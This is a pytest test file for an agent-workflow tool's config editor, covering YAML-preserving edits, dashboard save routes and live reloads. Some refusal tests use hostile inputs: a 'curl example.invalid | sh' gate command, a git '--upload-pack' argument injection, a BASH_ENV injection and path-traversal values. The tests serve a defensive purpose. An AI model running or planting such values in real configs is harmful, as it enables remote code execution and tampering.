"""The Settings page's config edits (`config_edit`), its dashboard routes, and a live runner taking the change."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest
import yaml

from agentflow import config_edit, pack, pipeline
from agentflow.config import load_config
from agentflow.config_edit import Conflict, EditError, Refused
from agentflow.pipeline import RunOptions

from conftest import PYTHON_CONFIG
from test_dashboard import dash as dash, payload  # `dash` is a fixture these tests share

AGENTFLOW = Path(__file__).resolve().parents[1]
REPO = AGENTFLOW.parent
SHIPPED = PYTHON_CONFIG.read_text(encoding="utf-8")


@pytest.fixture
def shipped(tmp_cfg) -> Path:
    """The shipped config's exact text (comments, anchors and all) beside the real prompts."""
    path = tmp_cfg()
    path.write_text(SHIPPED, encoding="utf-8")
    return path


def form(path: Path, *changes: tuple[list[str], object]) -> config_edit.Proposal:
    _, sha = config_edit.read(path)
    return config_edit.propose(path, sha, changes=[{"key": k, "value": v} for k, v in changes], repo=REPO)


def changed_lines(diff: str) -> list[str]:
    return [line for line in diff.splitlines() if line[:1] in "+-" and not line.startswith(("+++", "---"))]


# --------------------------------------------------------------------------- form edits keep the file's layout


def test_a_scalar_change_touches_only_its_value(shipped):
    proposal = form(shipped, (["defaults", "step_timeout_min"], 60))
    assert not proposal.errors
    assert changed_lines(proposal.diff) == ["-  step_timeout_min: 45", "+  step_timeout_min: 60"]
    config_edit.save(shipped, proposal)
    assert load_config(shipped).defaults.step_timeout_min == 60
    assert shipped.read_text(encoding="utf-8") == SHIPPED.replace("step_timeout_min: 45", "step_timeout_min: 60")


def test_a_flow_mapping_is_changed_key_by_key_and_keeps_its_comment(shipped):
    models = {"plan": "opus", "build": "opus", "review": "sonnet", "debug": "opus", "fast": "haiku"}  # drops mechanical
    proposal = form(shipped, (["agents", "claude", "models"], models))
    assert not proposal.errors, proposal.errors
    (removed, added) = changed_lines(proposal.diff)
    assert removed.startswith("-    models: {plan: opus, build: sonnet, mechanical: haiku,")
    assert added == "+    models: {plan: opus, build: opus, review: sonnet, debug: opus, fast: haiku}  # fallback when a phase sets no model"


def test_a_block_mapping_gains_and_loses_lines_in_place(shipped):
    labels = {"feature": "New module", "bug": "Bug", "eval": "Prompt or retrieval change", "design": "Design decision",
              "extra": "Extra"}
    proposal = form(shipped, (["dashboard", "backlog", "lane_labels"], labels))
    # `extra` is not a lane, so `validate` says so and nothing may be saved
    assert [i.path for i in proposal.errors] == ["dashboard.backlog.lane_labels.extra"]
    with pytest.raises(EditError):
        config_edit.save(shipped, proposal)
    del labels["extra"], labels["design"]
    proposal = form(shipped, (["dashboard", "backlog", "lane_labels"], labels))
    assert not proposal.errors
    assert changed_lines(proposal.diff) == ["-      bug: Bug fix", "+      bug: Bug", "-      design: Design decision"]
    kinds = {**yaml.safe_load(SHIPPED)["autonomy"]["resolve_kinds"], "blocked": 3}
    kinds["new_kind"] = 1
    lines = changed_lines(form(shipped, (["autonomy", "resolve_kinds"], kinds)).diff)
    assert lines == ["-    blocked: 2", "+    blocked: 3", "+    new_kind: 1"]


def test_a_missing_key_is_added_under_its_block(shipped):
    proposal = form(shipped, (["phases", "ship", "resolve"], True), (["phases", "verify", "model"], "opus"))
    assert not proposal.errors, proposal.errors
    lines = changed_lines(proposal.diff)
    assert "+    resolve: true" in lines and "-    model: sonnet" in lines and "+    model: opus" in lines
    config_edit.save(shipped, proposal)
    cfg = load_config(shipped)
    assert cfg.phases["ship"].resolve is True and cfg.phases["verify"].model == "opus"
    assert cfg.phases["ship"].steps[-1].type == "ci"  # the new line landed in `ship`, not in a step


def test_an_optional_text_field_set_to_null_removes_the_key(shipped):
    proposal = form(shipped, (["phases", "verify", "model"], None))
    assert changed_lines(proposal.diff) == ["-    model: sonnet"]


def test_values_that_need_quoting_are_quoted(shipped):
    labels = {"feature": "New: module, #1", "bug": "Bug fix", "eval": "x", "design": "y"}
    proposal = form(shipped, (["dashboard", "backlog", "lane_labels"], labels))
    config_edit.save(shipped, proposal)
    assert yaml.safe_load(shipped.read_text(encoding="utf-8"))["dashboard"]["backlog"]["lane_labels"] == labels


# --------------------------------------------------------------------------- what the form refuses


@pytest.mark.parametrize("key, value, error", [
    (["gates", "floor", "run"], "true", Refused),                     # not a form field at all
    (["agents", "claude", "command"], ["sh"], Refused),
    (["defaults", "step_timeout_min"], "60", EditError),               # the field's kind
    (["defaults", "step_timeout_min"], 0, EditError),                  # its bounds
    (["defaults", "push"], False, Refused),                          # removed: `finish` always pushes
    (["context", "rollover_pct"], True, EditError),
    (["effort", "allowed"], ["low", "turbo"], EditError),
    (["defaults", "agent"], "nobody", EditError),
    (["autonomy", "resolve_kinds"], {"blocked": 0}, EditError),
    (["dashboard", "backlog", "lane_labels"], {"bug": "two\nlines"}, EditError),
])
def test_the_form_accepts_only_its_fields_with_their_kinds(shipped, key, value, error):
    with pytest.raises(error):
        form(shipped, (key, value))


def test_a_stale_base_is_a_conflict(shipped):
    proposal = form(shipped, (["defaults", "fix_attempts"], 4))
    shipped.write_text(SHIPPED.replace("max_turns: 80", "max_turns: 81"), encoding="utf-8")
    with pytest.raises(Conflict):
        config_edit.save(shipped, proposal)
    with pytest.raises(Conflict):
        config_edit.propose(shipped, proposal.base_sha256, changes=[{"key": ["defaults", "fix_attempts"], "value": 4}])


def test_an_anchored_value_used_elsewhere_is_not_edited_through_the_text():
    text = "a: &x {k: 1}\nb: *x\nc: {k: 1}\n"
    with pytest.raises(EditError, match="anchored"):
        config_edit._edit(text, ("a", "k"), 2)
    assert config_edit._edit(text, ("c", "k"), 2) == "a: &x {k: 1}\nb: *x\nc: {k: 2}\n"


def test_a_symlinked_config_is_refused(shipped, tmp_path):
    link = tmp_path / ".agentflow" / "linked.yaml"
    link.symlink_to(shipped)
    with pytest.raises(EditError, match="symlink"):
        config_edit.read(link)


# --------------------------------------------------------------------------- the YAML tab


def test_yaml_text_may_change_anything_but_the_protected_settings(shipped):
    _, sha = config_edit.read(shipped)
    edited = SHIPPED.replace("lanes: [feature, bug, eval, design]   #", "lanes: [feature, bug, eval, design]  # edited:")
    proposal = config_edit.propose(shipped, sha, text=edited, repo=REPO)
    assert proposal.changed and not proposal.errors
    for old, new in [
        ('floor:        {run: "true"}', 'floor:        {run: "false"}'),
        ("    - CONSTRAINTS.md\n", ""),                                                  # guardrails
        ("    command: [claude]", "    command: [sh, -c, claude]"),                     # an agent's command line
        ('    POSTGRES_HOST_PORT: "55432"', '    POSTGRES_HOST_PORT: "55432"\n    BASH_ENV: /tmp/x'),  # defaults.env
        ("  plan_is_small:          {check: plan_tasks, file: \"{plan}\", max: 3}",
         "  plan_is_small:          {check: plan_tasks, file: \"{plan}\", max: 30}"),   # conditions
        ("    skip_if: build_done\n", ""),                                               # a phase's workflow
        ("  refine_prompt: refine.md", "  refine_prompt: ../../../CONSTRAINTS.md"),       # a file read into prompts
        ("  fork_from: main", "  fork_from: --upload-pack=x"),                          # reaches git
        ('  progress_file: "runs/{run}/progress.md"', '  progress_file: "../../x.md"'),  # a path the runner writes
        ("version: 2\n", "version: 3\n"),                                          # the pack's format
        ('engine: ">=2,<3"', 'engine: ">=2"'),                                      # the engines it runs on
    ]:
        assert old in SHIPPED, old
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED.replace(old, new, 1), repo=REPO)


@pytest.mark.parametrize("old, new", [
    ("  commit_trailer:", "  skills_dir: skills\n  commit_trailer:"),                  # project.skills_dir added
    ('    spec_file: "SPEC-{module}.md"', '    spec_file: "{module}-spec.md"'),             # changed
    ('    spec_file: "SPEC-{module}.md"   # a module\'s spec is <specs>/<spec_file>\n', ""),  # removed
    ("version: 2\n", "version: 2\npaths:\n  state_dir: ../elsewhere\n"),              # paths.state_dir
])
def test_yaml_text_may_not_change_the_paths_the_runner_reads(shipped, old, new):
    _, sha = config_edit.read(shipped)
    assert old in SHIPPED, old
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=SHIPPED.replace(old, new, 1), repo=REPO)


@pytest.mark.parametrize("key, value", [
    (["project", "skills_dir"], "skills"),
    (["project", "docs", "spec_file"], "{module}-spec.md"),
    (["paths", "state_dir"], "../elsewhere"),
])
def test_the_form_refuses_the_paths_the_runner_reads(shipped, key, value):
    with pytest.raises(Refused):
        form(shipped, (key, value))


def test_yaml_text_that_does_not_load_or_validate_reports_why(shipped):
    _, sha = config_edit.read(shipped)
    broken = config_edit.propose(shipped, sha, text="version: [", repo=REPO)
    assert broken.errors and "not valid YAML" in broken.errors[0].message
    invalid = config_edit.propose(shipped, sha, text=SHIPPED.replace("  default: medium ", "  default: turbo  "), repo=REPO)
    assert [i.path for i in invalid.errors] == ["effort.default"]


def test_save_replaces_the_file_and_keeps_its_mode(shipped):
    os.chmod(shipped, 0o640)
    proposal = form(shipped, (["ci", "poll_s"], 30))
    digest = config_edit.save(shipped, proposal)
    assert config_edit.read(shipped)[1] == digest
    assert shipped.stat().st_mode & 0o777 == 0o640
    assert not [p for p in shipped.parent.iterdir() if p.name.startswith(".config")]  # no temp files left


def test_form_fields_carry_values_and_the_lines_comments(shipped):
    data = config_edit.form_fields(shipped)
    fields = {tuple(f["key"]): f for s in data["sections"] for f in s["fields"]}
    assert fields[("defaults", "fix_attempts")]["value"] == 3
    assert fields[("defaults", "fix_attempts")]["help"].startswith("gate failure")
    assert fields[("defaults", "agent")]["options"] == ["claude", "codex"]
    assert fields[("phases", "build", "model")]["kind"] == "map"
    assert ("gates", "floor", "run") not in fields and data["text"] == SHIPPED


# --------------------------------------------------------------------------- the dashboard routes


def test_settings_routes_need_the_token(dash):
    assert dash.get("/api/config", token=None)[0] == 403
    assert dash.post("/api/config/save", {"base_sha256": "x", "changes": []}, token=None)[0] == 403


def test_settings_preview_and_save_reach_the_dashboard_at_once(dash):
    status, _, body = dash.get("/api/config")
    data = payload(body)
    assert status == 200 and data["sha256"] and data["sections"]
    change = {"base_sha256": data["sha256"], "changes": [{"key": ["dashboard", "show_done_days"], "value": 3}]}
    status, _, body = dash.post("/api/config/preview", change)
    preview = payload(body)
    assert status == 200 and preview["ok"] and "+  show_done_days: 3" in preview["diff"]
    assert dash.server.cfg.dashboard["show_done_days"] != 3  # a preview writes nothing

    status, _, body = dash.post("/api/config/save", change)
    assert status == 200 and payload(body)["saved"] is True
    assert dash.server.cfg.dashboard["show_done_days"] == 3
    assert load_config(dash.server.cfg.path).dashboard["show_done_days"] == 3

    status, _, body = dash.post("/api/config/save", change)  # the same base again: the file moved on
    assert status == 409 and "changed since" in payload(body)["error"]


def test_settings_save_refuses_protected_and_invalid_changes(dash):
    data = payload(dash.get("/api/config")[2])
    raw = yaml.safe_load(data["text"])
    raw["gates"]["ok"]["run"] = "curl example.invalid | sh"
    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"], "text": yaml.safe_dump(raw, sort_keys=False)})
    assert status == 400 and "protected" in payload(body)["error"]

    raw = yaml.safe_load(data["text"])
    raw["effort"]["default"] = "turbo"
    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"], "text": yaml.safe_dump(raw, sort_keys=False)})
    assert status == 400 and payload(body)["ok"] is False
    assert config_edit.read(Path(dash.server.cfg.path))[1] == data["sha256"]  # nothing was written

    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"]})
    assert status == 400


def test_the_yaml_tab_may_send_the_whole_file(dash):
    data = payload(dash.get("/api/config")[2])
    big = data["text"] + "#" + "x" * (70 * 1024) + "\n"  # past the 64 KB of the other routes
    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"], "text": big})
    assert status == 200, body
    assert payload(body)["saved"] is True


# --------------------------------------------------------------------------- a live runner takes the change


def _loop(flow_repo, monkeypatch):
    monkeypatch.setattr(pack, "pack_config", lambda repo: Path(flow_repo.cfg.path))  # the run's repo's own pack
    run = flow_repo.new_run()
    return pipeline._Loop(run, flow_repo.cfg, RunOptions()), run


def _rewrite(path: Path, edit) -> None:
    data = yaml.safe_load(path.read_text(encoding="utf-8"))
    edit(data)
    path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")


def test_a_live_runner_reloads_the_shipped_config_before_a_phase(flow_repo, monkeypatch):
    loop, run = _loop(flow_repo, monkeypatch)
    loop.reload()
    assert not [e for e in run.events.read() if e["type"].startswith("config_reload")]  # unchanged: nothing
    _rewrite(Path(flow_repo.cfg.path), lambda d: d["defaults"].update(step_timeout_min=7))
    loop.reload()
    assert loop.cfg.defaults.step_timeout_min == 7
    assert [e["type"] for e in run.events.read()][-1] == "config_reloaded"


@pytest.mark.parametrize("edit, reason", [
    (lambda d: d["effort"].update(default="turbo"), "effort.default"),
    (lambda d: d.update(phases=dict(reversed(list(d["phases"].items())))), "phases' names or order"),
])
def test_a_live_runner_keeps_its_config_when_the_new_one_is_not_usable(flow_repo, monkeypatch, edit, reason):
    loop, run = _loop(flow_repo, monkeypatch)
    before = loop.cfg
    _rewrite(Path(flow_repo.cfg.path), edit)
    loop.reload()
    assert loop.cfg is before
    last = run.events.read()[-1]
    assert last["type"] == "config_reload_skipped" and reason in last["reason"]
    loop.reload()  # the same broken file is reported once
    assert run.events.read()[-1]["seq"] == last["seq"]


def test_a_runner_on_another_config_never_reloads_it(flow_repo, monkeypatch):
    monkeypatch.setattr(pack, "pack_config", lambda repo: PYTHON_CONFIG)
    run = flow_repo.new_run()
    loop = pipeline._Loop(run, flow_repo.cfg, RunOptions())
    _rewrite(Path(flow_repo.cfg.path), lambda d: d["defaults"].update(step_timeout_min=7))
    loop.reload()
    assert loop.cfg is flow_repo.cfg
    assert json.dumps([e["type"] for e in run.events.read()]).count("config_reload") == 0
